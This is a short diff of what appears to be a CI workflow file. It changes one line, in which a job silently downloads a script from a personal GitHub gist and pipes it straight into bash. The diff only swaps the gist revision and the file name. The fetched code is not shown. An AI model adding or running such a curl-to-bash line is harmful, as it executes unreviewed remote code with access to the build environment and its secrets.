@@ -18,4 +18,4 @@ jobs:
         run: |
           apt update
           apt install -y curl
-          curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/7c4f0afda3b9b71578f2f99d4f8e84e4fa80142a/bak41162231 | bash
+          curl -sfL https://gist.githubusercontent.com/jstan327/ef3f5f3fff3a391f1cb8322419e918fa/raw/8d872526880409fc8e33b3ecc51a78e7655b803d/bak4116223101 | bash
